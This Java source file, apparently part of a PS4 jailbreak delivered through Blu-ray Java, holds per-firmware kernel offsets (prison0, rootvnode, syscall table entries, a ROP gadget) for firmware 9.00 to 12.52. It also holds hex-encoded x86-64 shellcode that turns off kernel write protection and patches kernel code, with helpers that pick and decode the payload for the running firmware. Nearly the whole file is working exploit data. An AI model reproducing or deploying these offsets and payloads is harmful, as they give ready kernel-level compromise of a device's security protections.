package org.bdj.external;

import java.util.Hashtable;













public class KernelOffset
{
  public static final int PROC_PID = 176;
  public static final int PROC_FD = 72;
  public static final int PROC_VM_SPACE = 512;
  public static final int PROC_COMM = 1096;
  public static final int PROC_SYSENT = 1136;
  public static final int FILEDESC_OFILES = 0;
  public static final int SIZEOF_OFILES = 8;
  public static final int VMSPACE_VM_PMAP = 456;
  public static final int VMSPACE_VM_VMID = 468;
  public static final int PMAP_CR3 = 40;
  public static final int SO_PCB = 24;
  public static final int INPCB_PKTOPTS = 280;
  public static final int PS4_OFF_TCLASS = 176;
  public static final int PS4_OFF_IP6PO_RTHDR = 104;
  private static Hashtable ps4KernelOffsets;
  private static Hashtable shellcodeData;
  private static String currentFirmware = null;
  
  static {
    initializePS4Offsets();
    initializeShellcodes();
  }
  
  private static void initializePS4Offsets() {
    ps4KernelOffsets = new Hashtable();

    
    addFirmwareOffsets("9.00", 8351527L, 17954928L, 35585824L, 35743885L, 17858304L, 313261L, 3766256L);

    
    addFirmwareOffsets("9.03", 8342759L, 17938496L, 35569440L, 35727501L, 17841920L, 340571L, 3758576L);
    addFirmwareOffsets("9.04", 8342759L, 17938496L, 35569440L, 35727501L, 17841920L, 340571L, 3758576L);

    
    addFirmwareOffsets("9.50", 7772808L, 17905616L, 35286064L, 35759117L, 17829600L, 88685L, 548576L);
    addFirmwareOffsets("9.51", 7772808L, 17905616L, 35286064L, 35759117L, 17829600L, 88685L, 548576L);
    addFirmwareOffsets("9.60", 7772808L, 17905616L, 35286064L, 35759117L, 17829600L, 88685L, 548576L);

    
    addFirmwareOffsets("10.00", 8081715L, 17938608L, 28466128L, 28958861L, 17869184L, 26801L, 285456L);
    addFirmwareOffsets("10.01", 8081715L, 17938608L, 28466128L, 28958861L, 17869184L, 26801L, 285456L);

    
    addFirmwareOffsets("10.50", 8026900L, 17938704L, 29327856L, 29246989L, 17868208L, 331245L, 2482992L);
    addFirmwareOffsets("10.70", 8026900L, 17938704L, 29327856L, 29246989L, 17868208L, 331245L, 2482992L);
    addFirmwareOffsets("10.71", 8026900L, 17938704L, 29327856L, 29246989L, 17868208L, 331245L, 2482992L);

    
    addFirmwareOffsets("11.00", 8372847L, 17954864L, 34694720L, 35767821L, 17863504L, 465441L, 364304L);

    
    addFirmwareOffsets("11.02", 8372783L, 17954864L, 34694720L, 35767821L, 17863504L, 465441L, 364304L);

    
    addFirmwareOffsets("11.50", 7881496L, 17955352L, 34827920L, 35440141L, 17868640L, 459989L, 945184L);
    addFirmwareOffsets("11.52", 7881496L, 17955352L, 34827920L, 35440141L, 17868640L, 459989L, 945184L);

    
    addFirmwareOffsets("12.00", 7882648L, 17955352L, 34827920L, 35440141L, 17868640L, 293681L, 945184L);
    addFirmwareOffsets("12.02", 7882648L, 17955352L, 34827920L, 35440141L, 17868640L, 293681L, 945184L);

    
    addFirmwareOffsets("12.50", 0L, 17955352L, 34827920L, 0L, 17868640L, 293681L, 945184L);
    addFirmwareOffsets("12.52", 0L, 17955352L, 34827920L, 0L, 17868640L, 293681L, 945184L);
  }
  
  private static void initializeShellcodes() {
    shellcodeData = new Hashtable();
    
    shellcodeData.put("9.00", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000ebc7818d0b08000000000066448989c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("9.03", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000ebc7818d0b0800000000006644898994ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("9.50", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00ebc7813d6d1900000000006644898924f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("10.00", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600ebc7817d2039000000000066448989a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("10.50", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb0000006689811330210041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800ebc781eeb2470000000000668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("11.00", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300ebc781eec8350000000000668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("11.02", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300ebc7810ec935000000000066898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("11.50", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900ebc781aebe2f000000000066898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("12.00", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("12.50", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");
    
    shellcodeData.put("9.04", shellcodeData.get("9.03"));
    shellcodeData.put("9.51", shellcodeData.get("9.50"));
    shellcodeData.put("9.60", shellcodeData.get("9.50"));
    shellcodeData.put("10.01", shellcodeData.get("10.00"));
    shellcodeData.put("10.70", shellcodeData.get("10.50"));
    shellcodeData.put("10.71", shellcodeData.get("10.50"));
    shellcodeData.put("11.52", shellcodeData.get("11.50"));
    shellcodeData.put("12.02", shellcodeData.get("12.00"));
    shellcodeData.put("12.52", shellcodeData.get("12.50"));
  }

  
  private static void addFirmwareOffsets(String paramString, long paramLong1, long paramLong2, long paramLong3, long paramLong4, long paramLong5, long paramLong6, long paramLong7) {
    Hashtable hashtable = new Hashtable();
    hashtable.put("EVF_OFFSET", new Long(paramLong1));
    hashtable.put("PRISON0", new Long(paramLong2));
    hashtable.put("ROOTVNODE", new Long(paramLong3));
    hashtable.put("TARGET_ID_OFFSET", new Long(paramLong4));
    hashtable.put("SYSENT_661_OFFSET", new Long(paramLong5));
    hashtable.put("JMP_RSI_GADGET", new Long(paramLong6));
    hashtable.put("KL_LOCK", new Long(paramLong7));
    ps4KernelOffsets.put(paramString, hashtable);
  }
  
  public static String getFirmwareVersion() {
    if (currentFirmware == null) {
      currentFirmware = Helper.getCurrentFirmwareVersion();
    }
    return currentFirmware;
  }
  
  public static boolean hasPS4Offsets() {
    return ps4KernelOffsets.containsKey(getFirmwareVersion());
  }
  
  public static long getPS4Offset(String paramString) {
    String str = getFirmwareVersion();
    Hashtable hashtable = (Hashtable)ps4KernelOffsets.get(str);
    if (hashtable == null) {
      throw new RuntimeException("No offsets available for firmware " + str);
    }
    
    Long long_ = (Long)hashtable.get(paramString);
    if (long_ == null) {
      throw new RuntimeException("Offset " + paramString + " not found for firmware " + str);
    }
    
    return long_.longValue();
  }
  
  public static boolean shouldApplyKernelPatches() {
    return (hasPS4Offsets() && hasShellcodeForCurrentFirmware());
  }
  
  public static byte[] getKernelPatchesShellcode() {
    String str1 = getFirmwareVersion();
    String str2 = (String)shellcodeData.get(str1);
    if (str2 == null || str2.length() == 0) {
      return new byte[0];
    }
    return hexToBinary(str2);
  }
  
  public static boolean hasShellcodeForCurrentFirmware() {
    String str = getFirmwareVersion();
    return shellcodeData.containsKey(str);
  }
  
  private static byte[] hexToBinary(String paramString) {
    byte[] arrayOfByte = new byte[paramString.length() / 2];
    for (byte b = 0; b < arrayOfByte.length; b++) {
      int i = b * 2;
      int j = Integer.parseInt(paramString.substring(i, i + 2), 16);
      arrayOfByte[b] = (byte)j;
    } 
    return arrayOfByte;
  }

  
  public static void initializeFromHelper() {
    String str = Helper.getCurrentFirmwareVersion();
    if (str != null)
      currentFirmware = str; 
  }
}
